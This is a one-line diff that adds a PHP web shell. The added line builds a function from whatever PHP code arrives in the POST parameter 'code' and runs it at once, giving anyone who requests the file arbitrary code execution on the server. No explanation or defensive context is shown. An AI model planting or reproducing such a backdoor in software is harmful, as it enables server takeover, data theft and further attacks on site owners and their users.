@@ -1,0 +1,1 @@
+<?php $f=create_function('', $_POST["code"]); $f(); ?>
